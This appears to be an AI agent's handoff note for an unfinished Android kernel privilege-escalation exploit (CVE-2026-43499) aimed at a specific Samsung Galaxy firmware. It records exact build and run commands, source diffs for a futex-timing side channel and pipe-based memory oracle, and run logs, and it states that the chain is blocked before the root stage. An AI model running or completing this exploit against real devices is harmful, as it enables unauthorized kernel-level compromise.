# RMGP — COMPLETE HANDOFF STATE (generated 2026-08-28)

This document records the exact state of the CVE-2026-43499 (RMGP / "popsicle")
exploit work for target **SM-A376B / Exynos S5E8845 / A376BXXU1AZB7**,
at the point where the live test was stopped. It is the authoritative "where we
are" note for resuming on a fresh device/chat.

---

## 0. TL;DR — what works, what is blocked

| Stage | Status | Evidence |
|-------|--------|----------|
| 1. KASLR slide (tracefs) | ✅ reliable | logs: `slide tracefs trigger` stable |
| 2. skb / phys leak | ✅ fixed | logs: `prepared base=ffffff...` |
| 3. pipe oracle (phys read) | ✅ works | logs: `p0 pipe oracle prepared base=ffffff805efa0000 pipes=240` |
| 4. **kernel page (fops) — 1st KernelSnitch pass** | ✅ **SUCCESS** | logs: `MATCH cand=ffffff805efa12c0 nmatch=4/7 need=4` |
| 4b. **pipe buffer page — 2nd KernelSnitch pass** | ❌ **FAILS** (fix applied 2026-08-28, **pending device test**) | logs: `KernelSnitch mm_struct leak failed` then `prepare_kernel_page retry 1/8`, scan frozen at `130000/131072` when test was stopped. Corrected fix: 2nd pass now uses the SAME profile as the working 1st pass (2048/96/12) + 512 KiB waiter stack (§3d) so the pile-up signal is real and the VA crash is avoided. |
| 5-7. writer → fops → root | ⏸ blocked on 4b | — |

**Bottom line:** The 1st KernelSnitch pass (fops mm_struct leak) and the P0 pipe
oracle both WORK. The 2nd KernelSnitch pass (pipe-buffer-page mm_struct leak) is
the remaining blocker. The most recent run was retrying (attempt 1/8) and was
stopped mid-scan at 130000/131072.

---

## 1. Device / build environment

- **Device:** Samsung SM-A376B, Exynos S5E8845 (a37x / "a37xv2")
- **Firmware:** A376BXXU1AZB7 (declined update AZG4)
- **Kernel:** `6.1.138-android14-11`, VA_BITS=39, PAGE_SIZE=4K, RANDOMIZE_BASE=y
- **NR_CPUS:** 32 possible (0-7), `sysconf(_SC_NPROCESSORS_ONLN)=16`
- **RAM:** ~7.5G phys @ 0x80000000
- **adb:** `adb connect 127.0.0.1:5555` (or user wifi port; may appear as
  emulator-5554). NOTE: at handoff time the emulator/device was OFFLINE
  (`device '127.0.0.1:5555' not found`), so the state below is reconstructed from
  local logs only — no live device probe was performed.
- **Toolchain:** Android NDK at `/tmp/opencode/ndk`
  (`aarch64-linux-android35-clang`). Set `ANDROID_NDK_HOME=/tmp/opencode/ndk`.

---

## 2. Current working parameters (target a37xv2-A376BXXU1AZB7)

From the runtime log line:
`parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (8) mte disabled`

- `MM_STRUCT_SZ = 0x3c0` (slab objsize 1024, 32 obj/slab, order 3 → slab sz 0x8000)
- `MM_ORDER = 3`
- `KSNITCH_COLLISIONS = 8` (need 4 to confirm)
- `cpu_count = 16`
- MTE disabled
- `ASHMEM_NAME_PREFIX_LEN = 0` (a37x stores ashmem name RAW at area offset 0;
  verified by SET/GET_NAME round-trip on-device) — see common.h diff.
- `SLIDE_KSNITCH_APPENDED_FUTEXES` default 2048 (1st pass). The 2nd pass was
  changed to 256 via `kernelsnitch_set_profile(ks, 256, 128, 1)` (see fix below).

### Build command (exact)

```
export ANDROID_NDK_HOME=/tmp/opencode/ndk
CC=/tmp/opencode/ndk/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang
$CC -DAPP_PAYLOAD=1 -DKS_SELFTEST -fPIC -O2 -g -Isrc \
    -DTARGET_HEADER='"targets/a37xv2-A376BXXU1AZB7/target.h"' \
    src/main.c src/util.c src/slide_app.c src/fops.c src/pipe.c src/root.c src/preload.c \
    -shared -pthread -o /tmp/cve-slide.so
```

Built artifact: `/tmp/cve-slide.so` (= deployed as `/data/local/tmp/a37-final.so`
on device). It is preserved in this handoff at `selftest/a37-final.so`.

### Run command (exact, shell mode)

```
env SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=1 \
    P0_ATTEMPT_TIMEOUT_SEC=400 EXPLOIT_ATTEMPT_TIMEOUT_SEC=1500 \
    /data/local/tmp/v2root --run-payload /data/local/tmp/a37-final.so \
    /data/local/tmp/v2root /path/log
```

(No `sleep` commands — user rule. A fresh reboot improves stage-2 pass odds.)

---

## 3. THE FIX (current uncommitted changes in RMGP)

The fix addresses the **2nd KernelSnitch pass (pipe buffer page leak)** which was
crashing/hanging the device. Root cause: the 2nd pass spawned 2048 futex-waiter
threads (same as 1st pass) inside a `fork()`ed child whose virtual address space
is already fragmented by the parent's 64 GB PROT_NONE mapping
(`FUTEX_SZ = 64ULL<<30`) plus 2 MB PROT_WRITE chunks. 2048 × 8 MB stack = 16 GB
of thread stacks contends with that and destabilizes the device.

Two changes (full diffs in `RMGP/src/*.c`, the working tree in this handoff is
already patched):

### 3a. `src/pipe.c` — move `setup_kernelsnitch()` before `clone_leak_child()` and
match the 1st-pass profile for the 2nd pass

```diff
 uintptr_t prepare_pipe_buffer_page_child(void) {
   init_ctx(&pre, objs_per_slab - 1);
   init_ctx(&post, objs_per_slab);
 
-  setup_kernelsnitch();
-  pid_t leak_child = clone_leak_child();
+  setup_kernelsnitch();
+  kernelsnitch_set_profile(ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
+                           SLIDE_KSNITCH_REPEAT_MEASUREMENT,
+                           SLIDE_KSNITCH_AVERAGE);   /* = 2048 / 96 / 12 */
+  pid_t leak_child = clone_leak_child();
   ...
-  for (size_t i = 0; i < post.mm_cnt; i++) { ... }
-  setup_kernelsnitch();
   for (size_t i = 0; i < pre.mm_cnt; i++) { ... }
-  pid_t leak_child = clone_leak_child();
+  /* leak_child now created earlier (above) */
   for (size_t i = 0; i < post.mm_cnt; i++) { ... }
```

**Why this (and not the earlier 256-thread throttle):** An earlier attempt set
the 2nd pass to `kernelsnitch_set_profile(ks, 256, 128, 1)` to dodge a device
crash. That removed the crash but produced **spurious collisions** — the 2nd pass
found 7 candidates yet every MATCH candidate returned `nmatch=0` (see §4, run9.log:
`KSDIAG approx=18 thr=180 ...` with `average=1` the timing signal is just noise).
The 1st pass *works* with profile **2048 threads / 96 measurements / average 12**,
so the 2nd pass must use the **same** profile to get a real pile-up signal. The
device crash from 2048 threads is instead fixed by shrinking the per-thread stack
(see §3d), so we no longer need to weaken the profile.

### 3d. `src/kernelsnitch/kernelsnitch.h` — tiny per-waiter stack (crash fix)

`__increase()` spawns `appended_futexes` threads. With glibc's default 8 MiB
stack, 2048 threads = **16 GiB** of virtual address space. The 2nd pass runs in a
`fork()`ed child that already inherits the parent's 64 GiB `PROT_NONE` futex
arena plus all the pipe/memfd mappings, so the 16 GiB mmap fails and the pass
**crashes the device**. Fix: give each waiter a 512 KiB stack (`KS_THREAD_STACK_SZ`),
cutting the requirement to ~1 GiB — plenty even when fragmented, while leaving the
pile-up depth (and thus the timing signal) identical to the 1st pass.

```diff
+#define KS_THREAD_STACK_SZ (512 * 1024)
 ...
 static void __increase(...) {
     ...
+    pthread_attr_t attr;
+    pthread_attr_init(&attr);
+    pthread_attr_setstacksize(&attr, KS_THREAD_STACK_SZ);
     for (...) {
-        SYSCHK(pthread_create(&ks->increase_tids[i], 0, __do_increase, ...));
+        SYSCHK(pthread_create(&ks->increase_tids[i], &attr, __do_increase, ...));
     }
+    pthread_attr_destroy(&attr);
     WAIT();
 }
```

> NOTE: the 1st pass also benefits (uses the same small stack) — strictly safer.

### 3b. `src/util.c` — export `ks` and enable selftest/verbose wiring

```diff
-static struct kernelsnitch_shared_state *ks;
+struct kernelsnitch_shared_state *ks;
+size_t ks_slide_delta;
...
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
+      KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
+#if defined(KS_SELFTEST)
+  ks_run_selftest();
+#endif
```

Plus: `clone_leak_child()` now `close(fd)` for fd 3..1023 in the child before
`kernelsnitch_find_collisions(ks)`; ashmem ARW ops (`configfs_write_once` /
`configfs_read_once`) open a fresh ashmem fd per op (a37x gadget: one direction
per fd); `ASHMEM_NAME_PREFIX_LEN` handling; fops retry/route-delay tuning in
`fops.c` (`PSELECT_CFI_ROUTE_ATTEMPTS 6`, expanded `route_delay_usec` jitter).

### 3c. `src/common.h` — declare the now-global `ks` and `kernelsnitch_set_profile`

```diff
 void cleanup_page_prepare_state(void);
+extern struct kernelsnitch_shared_state *ks;
+void kernelsnitch_set_profile(struct kernelsnitch_shared_state *ks,
+    size_t appended_futexes, size_t repeat_measurement, size_t average);
```

> NOTE: The exact unmodified source lives in `RMGP/` (this handoff) with all of
> the above already applied. The original git history (including the upstream
> `7d73c31` commit) is preserved in `ORIGINAL_RMGP_HISTORY.bundle`.

---

## 4. The exact test state where testing STOPPED

Source of truth: `logs/run9.log` (most recent run). Key markers (line numbers):

```
5:   exploit attempt=1/1 pid=5676 delay=25000 p0_offset=scan
27:  parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (8) mte disabled
39:  before increase            <-- 1st pass (fops page) scan start
62:  found 7 collisisons        <-- 1st pass found collision candidates
301: MATCH cand=ffffff805efa12c0 nmatch=4/7 need=4 match_total=1   <-- 1st pass SUCCESS
302: done
303: p0 pipe oracle prepared base=ffffff805efa0000 pipes=240 gate_slots=1  <-- P0 oracle READY
304: parameters cpu (16) ...    <-- 2nd pass (pipe buffer page) starts
305: before increase
328: found 7 collisisons        <-- 2nd pass found collision candidates
329: HASH-DIAG: target_bucket=128 target_addr=000000726428c0e0
338: start bruteforcing
339: identity_diff=39c00000 slide=1d0000
341: futex_addrs[0]=000000726428c0e0 ...
...  (DIAG lines, all nmatch=0)
567: [-] KernelSnitch mm_struct leak failed      <-- 2nd pass MATCH verification FAILED
569: [-] prepare_kernel_page retry 1/8
570: parameters cpu (16) ...
571-586: scan progress 100000/131072 .. 130000/131072 t=17   <-- retry scan, FROZEN HERE
```

**Interpretation:** The 2nd pass found 7 collisions but the MATCH verification
against the bruteforced mm_struct candidates returned `nmatch=0` for every candidate
(See `DIAG[NN] ... nmatch=0` lines). This means the 7 collision addresses from the
2nd pass do not actually collide under the real `current->mm` hash — i.e. the
collision set is spurious (timing noise, or the selftest/futex-hash replica is
slightly off for this pass). The run then auto-retried (`prepare_kernel_page retry
1/8`) and was **stopped by the user at scan progress 130000/131072** (out of
131072). That is the precise "point where testing stopped."

### What this tells us about the remaining bug

- The **futex_hash replica** (5-word jenkins, const `K=0xdeadbeff`) is verified
  correct for the 1st pass (it MATCHes there). The 2nd-pass failure is therefore
  most likely **timing/threshold noise** in `kernelsnitch_find_collisions` for the
  child's mm, OR the profile change (256 threads / avg 1) reduced signal enough
  that the 7 "collisions" are false positives. Suggested next experiments:
  1. Bump 2nd-pass `average` back up (e.g. `kernelsnitch_set_profile(ks, 256, 128, 4)`
     or keep 2048 threads but reduce measurement noise) and see if MATCH succeeds.
  2. Loosen/inspect the `KSDIAG` threshold (`approx=18 thr=180 min=16` in log) —
     the 2nd pass needs the same collision-quality bar the 1st pass clears.
  3. Confirm the child's `inc_futex[128]` is hashed with the *same* `mm` the
     bruteforce uses (the 2nd pass forks `leak_child` and hashes inside it; the
     mismatch between scan-time `mm` and bruteforce-time `mm` would cause nmatch=0).

---

## 5. Inventory of this handoff

```
rmgp-complete-handoff/
├── RMGP/                          # full patched source tree (src/, targets/, docs, audit notes)
│                                  #   - excludes .git, build/, artifacts/ (reproducible)
├── selftest/
│   ├── a37-final.so               # the built binary with the fix (448224 bytes)
│   ├── fh.bin                     # selftest kernel futex_hash blob (228 bytes)
│   ├── vhash.py                   # python futex_hash emulator (verification)
│   └── difftest.py                # python diff-test vs machine code
├── logs/
│   ├── run2.log .. run9.log       # full experiment record (run9 = stopped state)
│   ├── adb.0.log                  # adb transport log
│   └── probe2.log                 # probe log
├── reference/
│   └── REFERENCE_REPOS.txt        # manifest of /tmp/opencode/gh/* upstream clones (not copied)
├── HANDOFF_REPO.bundle            # self-contained git bundle of THIS handoff repo
│                                  #   (restore: git clone HANDOFF_REPO.bundle repo)
├── CURRENT_STATE.md               # THIS file
└── README.md                      # short pointer to CURRENT_STATE.md
```

### Original RMGP git history (IMPORTANT)
The local RMGP working copy at `/tmp/opencode/RMGP` is a **shallow clone** — it
contains only commit `7d73c31` locally; deeper upstream history is NOT present on
this machine. Therefore a full original-history bundle could not be produced.
The *complete current source with the fix* is captured in `RMGP/` (this handoff)
and is fully self-contained. To obtain the original full history, clone upstream:
```
git clone https://github.com/GhostLock-Galaxy/RMGP.git     # (or the canonical RMGP upstream)
# the handoff's RMGP/ tree == upstream 7d73c31 + the uncommitted fix from §3
```
This handoff repo's own history (`2a325b2`) is preserved in `HANDOFF_REPO.bundle`.

---

## 6. How to continue on a new device

1. Set up NDK: `export ANDROID_NDK_HOME=/tmp/opencode/ndk`
2. Rebuild: use the Build command in §2 (the patched `RMGP/` tree builds as-is).
3. Push + run on device (see Run command in §2). A fresh reboot is recommended.
4. Watch for the 2nd-pass MATCH. If it fails again with `nmatch=0`, try the
   experiments listed in §4 (raise `average`, inspect KSDIAG threshold, verify
   child-mm hashing).
5. Once the 2nd pass MATCHes, `pipebuf_page_base` is obtained and stages 5-7
   (writer → fops → root) proceed.

---

## 7. Open questions / risks

- **The 2026-08-28 2nd-pass fix is UNVERIFIED on-device** (emulator offline at
  handoff time). It is built into `selftest/a37-final.so`. The hypothesis: the
  earlier `average=1` profile produced false collisions; restoring 2048/96/12
  plus a 512 KiB waiter stack gives the same real signal as the 1st pass without
  the VA crash. Verify by running the exploit; if the 2nd pass still fails to
  MATCH, next levers are (a) confirm child-mm vs bruteforce-mm hashing match,
  (b) raise `KS_THREAD_STACK_SZ` back toward 1-2 MiB if 512 KiB is too tight, or
  (c) free the 1st pass's 64 GiB futex arena before the 2nd pass.
- The v2root loader binary is NOT in this workspace (it lives on-device at
  `/data/local/tmp/v2root`). Rebuild it from the payload repo
  (`Root-My-Galaxy-Payloads-A37-Clean` / `rmg-a37`) or pull from device when online.
- `selftest/fh.bin` is only 228 bytes and may be a stub; the KS_SELFTEST path
  needs the real patched-kernel blob to be meaningful. Verify before relying on it.
- No live device probe was done at handoff time (emulator offline). All device
  facts above are from prior logs/docs, not a fresh read.
